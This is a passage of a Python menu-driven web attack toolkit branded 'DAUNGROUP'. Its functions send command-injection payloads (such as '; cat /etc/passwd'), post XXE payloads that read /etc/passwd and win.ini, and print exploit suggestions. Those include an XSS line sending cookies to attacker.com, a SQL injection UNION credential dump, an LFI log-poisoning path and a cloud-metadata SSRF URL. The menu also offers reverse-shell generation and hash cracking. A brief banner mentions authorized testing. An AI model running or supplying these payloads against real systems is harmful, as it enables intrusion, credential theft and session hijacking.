                print(f"{status_color}[{resp.status_code}] {test_url}{C.E}")
                
                # Check for sensitive data in response
                if any(x in resp.text.lower() for x in ['password', 'token', 'api_key', 'secret', 'auth']):
                    pw(f"  -> Sensitive data detected in response!")
                
                found.append({"url": test_url, "status": resp.status_code, "method": method})
        except:
            pass
    
    return found

# ==================== COMMAND INJECTION TESTER ====================
def command_injection_test(url, params=None):
    pi(f"Testing for Command Injection on {url}")
    session = create_session()
    
    if not params:
        params = ['cmd', 'exec', 'command', 'execute', 'ping', 'ip', 'host']
    
    # Command injection payloads
    payloads = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "; id",
        "| id",
        "& id",
        "&& id",
        "|| id",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "`ls -la`",
        "$(ls -la)",
        "; sleep 5",
        "| sleep 5"
    ]
    
    vulnerable = []
    
    for param in params:
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                start = time.time()
                resp = session.get(test_url, timeout=10, verify=False)
                elapsed = time.time() - start
                
                # Check for command output indicators
                indicators = ['root:', 'bin', 'usr/bin', 'uid=', 'gid=', 'groups=']
                if any(ind in resp.text for ind in indicators):
                    ps(f"CMD INJECTION FOUND! Param: {param} | Payload: {payload[:30]}")
                    vulnerable.append({"param": param, "payload": payload})
                    break
                
                # Time-based detection
                if "sleep" in payload and elapsed > 5:
                    ps(f"CMD INJECTION FOUND (Time-based)! Param: {param}")
                    vulnerable.append({"param": param, "payload": payload, "type": "time-based"})
                    break
            except:
                pass
    
    return vulnerable

# ==================== XXE INJECTION TESTER ====================
def xxe_test(url):
    pi(f"Testing for XXE (XML External Entity) on {url}")
    session = create_session()
    
    xxe_payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
<foo>&xxe;</foo>"""
    ]
    
    vulnerable = []
    
    for payload in xxe_payloads:
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = session.post(url, data=payload, headers=headers, timeout=5, verify=False)
            
            # Check for file content
            if 'root:' in resp.text or '[boot loader]' in resp.text:
                ps(f"XXE VULNERABILITY FOUND!")
                print(f"{C.C}Response: {resp.text[:200]}{C.E}")
                vulnerable.append({"payload": payload[:50], "response": resp.text[:200]})
                break
        except:
            pass
    
    if not vulnerable:
        pi("No XXE vulnerability detected")
    
    return vulnerable
def generate_report(data, filename=None):
    if not filename:
        filename = f"DAUNGROUP_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
        ps(f"Report saved to {filename}")
        
        # Generate HTML report
        html_filename = filename.replace('.json', '.html')
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>DAUNGROUP Security Report</title>
    <style>
        body {{ font-family: Arial; background: #1a1a1a; color: #00ff00; padding: 20px; }}
        h1 {{ color: #00ff00; border-bottom: 2px solid #00ff00; }}
        .section {{ background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .vuln {{ color: #ff0000; font-weight: bold; }}
        .safe {{ color: #00ff00; }}
        .warning {{ color: #ffaa00; }}
        pre {{ background: #000; padding: 10px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>🔥 DAUNGROUP Security Assessment Report 🔥</h1>
    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <div class="section">
        <h2>Scan Results</h2>
        <pre>{json.dumps(data, indent=2)}</pre>
    </div>
</body>
</html>
"""
        with open(html_filename, 'w') as f:
            f.write(html_content)
        ps(f"HTML report saved to {html_filename}")
        
    except Exception as e:
        pe(f"Error saving report: {e}")

# ==================== EXPLOIT SUGGESTER ====================
def suggest_exploits(vulnerabilities):
    pi("Analyzing vulnerabilities and suggesting exploits...")
    
    if not vulnerabilities:
        pw("No vulnerabilities found to analyze")
        return
    
    suggestions = []
    
    # XSS exploits
    if 'xss' in str(vulnerabilities).lower():
        suggestions.append({
            "type": "XSS",
            "severity": "MEDIUM-HIGH",
            "exploit": "Cookie stealing, Session hijacking, Phishing",
            "payload": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
        })
    
    # SQLi exploits
    if 'sqli' in str(vulnerabilities).lower() or 'sql' in str(vulnerabilities).lower():
        suggestions.append({
            "type": "SQL Injection",
            "severity": "CRITICAL",
            "exploit": "Database dump, Authentication bypass, Data manipulation",
            "payload": "' UNION SELECT username,password FROM users--"
        })
    
    # LFI exploits
    if 'lfi' in str(vulnerabilities).lower():
        suggestions.append({
            "type": "LFI",
            "severity": "HIGH",
            "exploit": "File disclosure, RCE via log poisoning",
            "payload": "../../../../var/log/apache2/access.log"
        })
    
    # SSRF exploits
    if 'ssrf' in str(vulnerabilities).lower():
        suggestions.append({
            "type": "SSRF",
            "severity": "HIGH",
            "exploit": "Internal network scanning, Cloud metadata access",
            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        })
    
    if suggestions:
        ph("=" * 60)
        ph("EXPLOIT SUGGESTIONS:")
        ph("=" * 60)
        for sugg in suggestions:
            print(f"\n{C.F}[!] {sugg['type']} - Severity: {sugg['severity']}{C.E}")
            print(f"{C.W}    Exploit: {sugg['exploit']}{C.E}")
            print(f"{C.C}    Example: {sugg['payload']}{C.E}")
    
    return suggestions

# ==================== MAIN MENU ====================
def main_menu():
    while True:
        banner()
        print(f"\n{C.BOLD}{C.C}╔════════════════════════════════════════════════╗{C.E}")
        print(f"{C.BOLD}{C.C}║           SELECT ATTACK VECTOR                ║{C.E}")
        print(f"{C.BOLD}{C.C}╚════════════════════════════════════════════════╝{C.E}\n")
        
        print(f"{C.G}[01]{C.E} 🔍 Subdomain Enumeration {C.BOLD}(AGGRESSIVE){C.E}")
        print(f"{C.G}[02]{C.E} 🔓 Port Scanner {C.BOLD}(FAST & FURIOUS){C.E}")
        print(f"{C.G}[03]{C.E} 📁 Directory Bruteforce {C.BOLD}(HARDCORE){C.E}")
        print(f"{C.G}[04]{C.E} 🛡️  WAF/Security Detection {C.BOLD}(STEALTH){C.E}")
        print(f"{C.G}[05]{C.E} 💉 XSS Scanner {C.BOLD}(20+ PAYLOADS){C.E}")
        print(f"{C.G}[06]{C.E} 💉 SQL Injection Scanner {C.BOLD}(ADVANCED){C.E}")
        print(f"{C.G}[07]{C.E} 📂 LFI/RFI Scanner {C.BOLD}(FILE INCLUSION){C.E}")
        print(f"{C.G}[08]{C.E} 🌐 SSRF Scanner {C.BOLD}(CLOUD METADATA){C.E}")
        print(f"{C.G}[09]{C.E} 🔀 Open Redirect Scanner")
        print(f"{C.G}[10]{C.E} 🔒 Security Headers Analyzer")
        print(f"{C.G}[11]{C.E} 🔬 Technology Detection")
        print(f"{C.G}[12]{C.E} 🕷️  Web Crawler/Spider")
        print(f"{C.G}[16]{C.E} 🔥 Nmap Scanner {C.BOLD}(AGGRESSIVE/STEALTH){C.E}")
        print(f"{C.G}[17]{C.E} 🌐 Nikto Web Scanner {C.BOLD}(FULL SCAN){C.E}")
        print(f"{C.G}[18]{C.E} 💉 SQLMap Integration {C.BOLD}(AUTO EXPLOIT){C.E}")
        print(f"{C.G}[19]{C.E} 🔐 Hash Cracker {C.BOLD}(MD5/SHA/etc){C.E}")
        print(f"{C.G}[20]{C.E} 🎫 JWT Token Decoder & Analyzer")
        print(f"{C.G}[21]{C.E} 🐚 Reverse Shell Generator {C.BOLD}(ALL TYPES){C.E}")
        print(f"{C.G}[22]{C.E} 🔒 Payload Encoder {C.BOLD}(URL/BASE64/HEX){C.E}")
        print(f"{C.G}[23]{C.E} 🔌 API Fuzzer {C.BOLD}(REST/GraphQL){C.E}")
        print(f"{C.G}[24]{C.E} 💻 Command Injection Tester")
        print(f"{C.G}[25]{C.E} 📄 XXE Injection Tester")
        print(f"{C.G}[13]{C.E} 💣 Full Reconnaissance {C.BOLD}{C.F}(ALL TOOLS){C.E}")
        print(f"{C.G}[14]{C.E} 🎯 Exploit Suggester")
        print(f"{C.G}[15]{C.E} 📊 Generate Report")
        print(f"{C.G}[00]{C.E} 🚪 Exit")
        
        choice = input(f"\n{C.C}┌─[{C.F}DAUNGROUP{C.C}@{C.G}BugHunter{C.C}]─[{C.W}~{C.C}]\n└──╼ {C.BOLD}${C.E} ")
        
        try:
            if choice == "1" or choice == "01":
                domain = input(f"{C.C}[?] Enter target domain: {C.E}")
                subdomain_enum_advanced(domain)
            
            elif choice == "2" or choice == "02":
                target = input(f"{C.C}[?] Enter target IP/domain: {C.E}")
                port_range = input(f"{C.C}[?] Port range (default 1-1000): {C.E}") or "1-1000"
                port_scan_aggressive(target, port_range)
            
            elif choice == "3" or choice == "03":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                dir_bruteforce_advanced(url)
            
            elif choice == "4" or choice == "04":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                detect_waf_advanced(url)
            
            elif choice == "5" or choice == "05":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                results = xss_scan_advanced(url, params)
                if results:
                    suggest_exploits(results)
            
            elif choice == "6" or choice == "06":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                results = sqli_scan_advanced(url, params)
                if results:
                    suggest_exploits(results)
            
            elif choice == "7" or choice == "07":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                results = lfi_scan(url, params)
                if results:
                    suggest_exploits(results)
            
            elif choice == "8" or choice == "08":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                results = ssrf_scan(url, params)
                if results:
                    suggest_exploits(results)
            
            elif choice == "9" or choice == "09":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                redirect_scan(url, params)
            
            elif choice == "10":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                analyze_headers_advanced(url)
            
            elif choice == "11":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                detect_technologies(url)
            
            elif choice == "12":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                max_pages = input(f"{C.C}[?] Max pages to crawl (default 50): {C.E}") or "50"
                crawl_website(url, int(max_pages))
            
            elif choice == "13":
                target = input(f"{C.C}[?] Enter target domain/URL: {C.E}")
                ph("=" * 60)
                ph("STARTING FULL RECONNAISSANCE - ALL WEAPONS ARMED")
                ph("=" * 60)
                
                results = {
                    "target": target,
                    "timestamp": datetime.now().isoformat(),
                    "scan_type": "full_recon"
                }
                
                parsed = urlparse(target)
                domain = parsed.netloc or target
                url = target if parsed.scheme else f"http://{target}"
                
                # Run all scans
                pi("Phase 1: Subdomain Enumeration")
                results['subdomains'] = subdomain_enum_advanced(domain)
                
                pi("\nPhase 2: Port Scanning")
                results['ports'] = port_scan_aggressive(domain)
                
                pi("\nPhase 3: Directory Bruteforce")
                results['directories'] = dir_bruteforce_advanced(url)
                
                pi("\nPhase 4: WAF Detection")
                results['waf'] = detect_waf_advanced(url)
                
                pi("\nPhase 5: Technology Detection")
                results['technologies'] = detect_technologies(url)
                
                pi("\nPhase 6: Security Headers")
                results['headers'] = dict(analyze_headers_advanced(url))
                
                pi("\nPhase 7: XSS Scanning")
                results['xss'] = xss_scan_advanced(url)
                
                pi("\nPhase 8: SQL Injection Scanning")
                results['sqli'] = sqli_scan_advanced(url)
                
                pi("\nPhase 9: LFI Scanning")
                results['lfi'] = lfi_scan(url)
                
                pi("\nPhase 10: SSRF Scanning")
                results['ssrf'] = ssrf_scan(url)
                
                ph("=" * 60)
                ps("FULL RECONNAISSANCE COMPLETED!")
                ph("=" * 60)
                
                # Auto-generate report
                generate_report(results)
                
                # Suggest exploits
                all_vulns = {**results.get('xss', {}), **results.get('sqli', {}), 
                            **results.get('lfi', {}), **results.get('ssrf', {})}
                suggest_exploits(all_vulns)
            
            elif choice == "14":
                pi("Load previous scan results to analyze...")
                filename = input(f"{C.C}[?] Enter report filename: {C.E}")
                try:
                    with open(filename, 'r') as f:
                        data = json.load(f)
                    suggest_exploits(data)
                except:
                    pe("Could not load report file")
            
            elif choice == "15":
                pi("Report generation happens automatically after full scan")
                pw("Run option 13 for full reconnaissance with auto-report")
            
            elif choice == "16":
                target = input(f"{C.C}[?] Enter target: {C.E}")
                scan_type = input(f"{C.C}[?] Scan type (quick/aggressive/stealth/vuln/full): {C.E}") or "aggressive"
                nmap_scan(target, scan_type)
            
            elif choice == "17":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                nikto_scan(url)
            
            elif choice == "18":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                param = input(f"{C.C}[?] Parameter to test (leave empty for auto-crawl): {C.E}") or None
                sqlmap_scan(url, param)
            
            elif choice == "19":
                hash_value = input(f"{C.C}[?] Enter hash: {C.E}")
                crack_hash(hash_value)
            
            elif choice == "20":
                token = input(f"{C.C}[?] Enter JWT token: {C.E}")
                jwt_decode(token)
            
            elif choice == "21":
                ip = input(f"{C.C}[?] Enter your IP (LHOST): {C.E}")
                port = input(f"{C.C}[?] Enter port (LPORT): {C.E}") or "4444"
                shell_type = input(f"{C.C}[?] Shell type (bash/nc/python/php/perl/ruby/powershell): {C.E}") or "bash"
                generate_reverse_shell(ip, port, shell_type)
            
            elif choice == "22":
                payload = input(f"{C.C}[?] Enter payload to encode: {C.E}")
                enc_type = input(f"{C.C}[?] Encoding type (url/double_url/base64/hex/html/unicode/all): {C.E}") or "all"
                encode_payload(payload, enc_type)
            
            elif choice == "23":
                url = input(f"{C.C}[?] Enter API base URL: {C.E}")
                method = input(f"{C.C}[?] HTTP method (GET/POST/PUT/DELETE): {C.E}") or "GET"
                api_fuzzer(url, method)
            
            elif choice == "24":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                params = input(f"{C.C}[?] Parameters (comma-separated, leave empty for auto): {C.E}")
                params = [p.strip() for p in params.split(',')] if params else None
                command_injection_test(url, params)
            
            elif choice == "25":
                url = input(f"{C.C}[?] Enter URL: {C.E}")
                xxe_test(url)
            
            elif choice == "0" or choice == "00":
                print(f"\n{C.C}╔════════════════════════════════════════════════╗{C.E}")
                print(f"{C.C}║  {C.G}Thank you for using DAUNGROUP Toolkit!    {C.C}║{C.E}")
                print(f"{C.C}║  {C.W}Remember: Only test authorized targets!   {C.C}║{C.E}")
                print(f"{C.C}║  {C.F}Happy Hunting! Stay Ethical! 🎯           {C.C}║{C.E}")
                print(f"{C.C}╚════════════════════════════════════════════════╝{C.E}\n")
                sys.exit(0)
            
            else:
                pe("Invalid choice! Please select 0-15")
        
        except KeyboardInterrupt:
            pw("\nOperation cancelled by user")
        except Exception as e:
            pe(f"Error: {e}")
        
        input(f"\n{C.C}Press ENTER to continue...{C.E}")

if __name__ == "__main__":
    try:
        # Check if running as root (optional warning)
        if os.geteuid() != 0:
            pw("Not running as root - some features may be limited")
            time.sleep(1)
        
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{C.F}[!] Interrupted by user. Exiting...{C.E}\n")
        sys.exit(0)
    except Exception as e:
        pe(f"Fatal error: {e}")
        sys.exit(1)
